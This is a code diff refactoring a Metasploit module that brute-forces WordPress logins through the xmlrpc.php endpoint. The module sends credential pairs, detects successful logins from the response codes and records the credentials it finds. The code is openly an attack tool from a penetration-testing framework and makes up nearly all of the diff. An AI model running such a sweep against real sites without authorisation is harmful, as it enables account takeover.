@@ -39,7 +39,6 @@ class Metasploit3 < Msf::Auxiliary
         [
           Opt::RPORT(80),
           OptString.new('TARGETURI', [true, 'The path to wordpress xmlrpc file, default is /xmlrpc.php', '/xmlrpc.php']),
-          # OptBool.new('VERBOSE', [false, 'Whether to print output for all attempts', false]) # warning
         ], self.class)
 
     deregister_options('BLANK_PASSWORDS') # we don't need this option
@@ -55,14 +54,15 @@ class Metasploit3 < Msf::Auxiliary
     xml << '</methodCall>'
 
     res = send_request_cgi(
-      'uri'       => datastore['TARGETURI'],
+      'uri'       => target_uri.path,
       'method'    => 'POST',
-      'data'      => "#{xml}"
+      'data'      => xml
     )
 
     if res && res.body =~ /<string>Hello!<\/string>/
       return true # xmlrpc is enabled
     end
+    return false
   end
 
   def generate_xml_request(user, pass)
@@ -77,20 +77,18 @@ class Metasploit3 < Msf::Auxiliary
     xml
   end
 
-  def run_host(_ip)
-    print_status("Checking #{rhost}:#{datastore['TARGETURI']} for xmlrpc..")
-    if !xmlrpc_enabled?
-      print_error("#{rhost} XMLRPC is not enabled! -- Aborting")
-      return :abort
+  def run_host(ip)
+    print_status("#{peer}:#{target_uri.path} - Sending Hello...")
+    if xmlrpc_enabled?
+      vprint_good("XMLRPC enabled, Hello message received!")
     else
-      vprint_good('XMLRPC enabled, Hello message received!')
+      print_error("XMLRPC is not enabled! Aborting")
+      return :abort
     end
 
-    print_status("#{rhost}:#{rport} - Starting XML-RPC login sweep")
+    print_status("#{peer} - Starting XML-RPC login sweep...")
     each_user_pass do |user, pass|
-      if user != "" # empty line fix ?
-        do_login(user, pass)
-      end
+      do_login(user, pass)
     end
   end
 
@@ -100,53 +98,51 @@ class Metasploit3 < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => datastore['TARGETURI'],
+          'uri'       => target_uri.path,
           'method'    => 'POST',
-          'data'      => "#{xml_req}"
+          'data'      => xml_req
         }, 25)
       http_fingerprint(response: res)
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-      print_error('HTTP Connection Failed, Aborting')
+      print_error("#{peer} - HTTP Connection Failed, Aborting")
       return :abort
     end
 
     unless res
-      print_error('Connection timed out, Aborting')
+      print_error("#{peer} - Connection timed out, Aborting")
       return :abort
     end
 
     if res.code != 200
-      vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
+      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
       return :skip_pass
     end
 
-    if res.code == 200
-      # TODO: add more error codes
-      if res.body =~ /<value><int>403<\/int><\/value>/
-        vprint_error("FAILED LOGIN. '#{user}' : '#{pass}'")
-        return :skip_pass
+    # TODO: add more error codes
+    if res.body =~ /<value><int>403<\/int><\/value>/
+      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
+      return :skip_pass
 
-      elsif res.body =~ /<value><int>-32601<\/int><\/value>/
-        print_error('Server error: Requested method `wp.getUsers` does not exists. -- Aborting')
-        return :abort
+    elsif res.body =~ /<value><int>-32601<\/int><\/value>/
+      print_error('Server error: Requested method `wp.getUsers` does not exists. -- Aborting')
+      return :abort
 
-      elsif res.body =~ /<value><int>401<\/int><\/value>/ || res.body =~ /<name>user_id<\/name>/
-        print_good("SUCESSFUL LOGIN. '#{user}' : '#{pass}'")
-        # If verbose set True, dump xml response
-        vprint_good("#{res}")
+    elsif res.body =~ /<value><int>401<\/int><\/value>/ || res.body =~ /<name>user_id<\/name>/
+      print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
+      # If verbose set True, dump xml response
+      vprint_good("#{res}")
 
-        report_hash = {
-          host: datastore['RHOST'],
-          port: datastore['RPORT'],
-          sname: 'wordpress-xmlrpc',
-          user: user,
-          pass: pass,
-          active: true,
-          type: 'password' }
+      report_hash = {
+        host: rhost,
+        port: rport,
+        sname: 'wordpress-xmlrpc',
+        user: user,
+        pass: pass,
+        active: true,
+        type: 'password' }
 
-        report_auth_info(report_hash)
-        return :next_user
-      end
+      report_auth_info(report_hash)
+      return :next_user
     end
   end
 end
